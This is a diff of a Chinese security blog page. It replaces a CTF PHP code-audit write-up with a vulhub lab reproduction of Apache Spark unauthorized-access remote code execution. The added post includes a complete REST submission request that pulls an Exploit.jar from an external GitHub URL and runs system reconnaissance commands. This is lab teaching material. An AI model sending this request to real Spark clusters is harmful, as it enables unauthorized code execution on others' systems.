@@ -16,31 +16,27 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[GDOUCTF 2023]受不了一点0x00 这个就是代码审计 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phperror_reporting(0);header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);if">
+    <meta name="description" content="介绍apache顶级项目，大规模数据处理计算引擎。为了方便的给使用者控制系统进行计算和查看任务结果，提供了WebUI图形化界面和相应的REST API方便用户操作。支持用户向管理节点提交应用，并分发给集群使用，如果管理节点未启用ACL（访问控制），我们便可在集群中执行任意代码。 环境搭建进入vulhub-master&#x2F;spark&#x2F;unacc  使用 1docker-compos">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计">
-<meta property="og:url" content="https://tsy244.github.io/2024/01/25/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:title" content="Spark未授权访问">
+<meta property="og:url" content="https://tsy244.github.io/2024/01/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="[GDOUCTF 2023]受不了一点0x00 这个就是代码审计 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phperror_reporting(0);header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);if">
+<meta property="og:description" content="介绍apache顶级项目，大规模数据处理计算引擎。为了方便的给使用者控制系统进行计算和查看任务结果，提供了WebUI图形化界面和相应的REST API方便用户操作。支持用户向管理节点提交应用，并分发给集群使用，如果管理节点未启用ACL（访问控制），我们便可在集群中执行任意代码。 环境搭建进入vulhub-master&#x2F;spark&#x2F;unacc  使用 1docker-compos">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184501023.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184614075.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184636644.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184707258.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184819978.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125185033074.png">
-<meta property="article:published_time" content="2024-01-25T10:43:12.000Z">
-<meta property="article:modified_time" content="2024-01-25T10:50:36.237Z">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240126000543877.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240126000721812.png">
+<meta property="article:published_time" content="2024-01-25T15:58:01.000Z">
+<meta property="article:modified_time" content="2024-01-25T16:09:01.427Z">
 <meta property="article:author" content="August Rosenberg">
-<meta property="article:tag" content="CTF刷题记录">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184501023.png">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240126000543877.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>代码审计 - AU9U5T</title>
+  <title>Spark未授权访问 - AU9U5T</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -206,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="代码审计"></span>
+            <span id="subtitle" data-typed-text="Spark未授权访问"></span>
           
         </div>
 
@@ -222,7 +218,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-01-25 18:43" pubdate>
+        <time datetime="2024-01-25 23:58" pubdate>
           January 25, 2024 pm
         </time>
       </span>
@@ -234,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k words
+          1.4k words
         
       </span>
     
@@ -245,7 +241,7 @@
         
         
         
-          13 mins
+          12 mins
         
       </span>
     
@@ -283,29 +279,21 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">代码审计</h1>
+            <h1 style="display: none">Spark未授权访问</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="GDOUCTF-2023-受不了一点"><a href="#GDOUCTF-2023-受不了一点" class="headerlink" title="[GDOUCTF 2023]受不了一点"></a>[GDOUCTF 2023]受不了一点</h1><p>0x00</p>
-<p>这个就是代码审计</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>] == <span class="hljs-string">&#x27;j0k3r&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$aaa</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];<br>                    <span class="hljs-variable">$bbb</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>];<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$aaa</span> == <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$bbb</span> == <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$aaa</span> != <span class="hljs-variable">$bbb</span>) &#123;<br>                        <span class="hljs-variable">$give</span> = <span class="hljs-string">&#x27;cancanwordflag&#x27;</span>;<br>                        <span class="hljs-variable">$get</span> = <span class="hljs-string">&#x27;hacker!&#x27;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$give</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span> || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$get</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                            <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                            <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;洗洗睡吧&quot;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;行不行啊细狗&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;菜菜&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;就这?&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;别来沾边&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+                <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>apache顶级项目，大规模数据处理计算引擎。为了方便的给使用者控制系统进行计算和查看任务结果，提供了WebUI图形化界面和相应的REST API方便用户操作。支持用户向管理节点提交应用，并分发给集群使用，如果管理节点未启用ACL（访问控制），我们便可在集群中执行任意代码。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>进入vulhub-master&#x2F;spark&#x2F;unacc </p>
+<p>使用</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure>
 
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240126000543877.png" srcset="/img/loading.gif" lazyload alt="image-20240126000543877"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240126000721812.png" srcset="/img/loading.gif" lazyload alt="image-20240126000721812"></p>
+<p>发现版本是2.3.1</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/submissions/create</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:6066<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>680<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog">  <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;CreateSubmissionRequest&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;clientSparkVersion&quot;</span>: <span class="hljs-string">&quot;2.3.1&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;appArgs&quot;</span>: [</span><br><span class="language-prolog">    <span class="hljs-string">&quot;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;</span></span><br><span class="language-prolog">  ],</span><br><span class="language-prolog">  <span class="hljs-string">&quot;appResource&quot;</span>: <span class="hljs-string">&quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;environmentVariables&quot;</span>: &#123;</span><br><span class="language-prolog">    <span class="hljs-string">&quot;SPARK_ENV_LOADED&quot;</span>: <span class="hljs-string">&quot;1&quot;</span></span><br><span class="language-prolog">  &#125;,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;mainClass&quot;</span>: <span class="hljs-string">&quot;Exploit&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;sparkProperties&quot;</span>: &#123;</span><br><span class="language-prolog">    <span class="hljs-string">&quot;spark.jars&quot;</span>: <span class="hljs-string">&quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;</span>,</span><br><span class="language-prolog">    <span class="hljs-string">&quot;spark.driver.supervise&quot;</span>: <span class="hljs-string">&quot;false&quot;</span>,</span><br><span class="language-prolog">    <span class="hljs-string">&quot;spark.app.name&quot;</span>: <span class="hljs-string">&quot;Exploit&quot;</span>,</span><br><span class="language-prolog">    <span class="hljs-string">&quot;spark.eventLog.enabled&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,</span><br><span class="language-prolog">    <span class="hljs-string">&quot;spark.submit.deployMode&quot;</span>: <span class="hljs-string">&quot;cluster&quot;</span>,</span><br><span class="language-prolog">    <span class="hljs-string">&quot;spark.master&quot;</span>: <span class="hljs-string">&quot;spark://your-ip:6066&quot;</span></span><br><span class="language-prolog">  &#125;</span><br><span class="language-prolog">&#125;</span><br><span class="language-prolog"></span><br></code></pre></td></tr></table></figure>
 
-
-<p>0x01</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184501023.png" srcset="/img/loading.gif" lazyload alt="image-20240125184501023"></p>
-<p>这个地方只需要进行数组绕过就可以了</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184614075.png" srcset="/img/loading.gif" lazyload alt="image-20240125184614075"></p>
-<p>设置cookie</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184636644.png" srcset="/img/loading.gif" lazyload alt="image-20240125184636644"></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184707258.png" srcset="/img/loading.gif" lazyload alt="image-20240125184707258"></p>
-<p>两个等号这个是弱比较</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_47804678/article/details/128814377">php比较绕过（强比较“&#x3D;&#x3D;&#x3D;”&#x2F;弱比较“&#x3D;&#x3D;“）-CSDN博客</a></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184819978.png" srcset="/img/loading.gif" lazyload alt="image-20240125184819978"></p>
-<p>这个地方只需要设置一个flag，而且这个部分并没有对其他的参数进行过滤，我们只需要将其他参数设置成flag然后Falg使用这个参数就可以了</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125185033074.png" srcset="/img/loading.gif" lazyload alt="image-20240125185033074"></p>
 
                 
               </div>
@@ -318,7 +306,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">#CTF刷题记录</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
       
     </div>
   
@@ -330,8 +318,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>代码审计</div>
-      <div>https://tsy244.github.io/2024/01/25/CTF刷题记录/WEB/代码审计/</div>
+      <div>Spark未授权访问</div>
+      <div>https://tsy244.github.io/2024/01/25/漏洞复现/Spark未授权访问/</div>
     </div>
     <div class="license-meta">
       
@@ -375,18 +363,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/01/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Spark未授权访问">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Spark未授权访问</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/01/25/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/" title="Socks代理">
-                        <span class="hidden-mobile">Socks代理</span>
+                      <a href="/2024/01/25/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <span class="hidden-mobile">代码审计</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
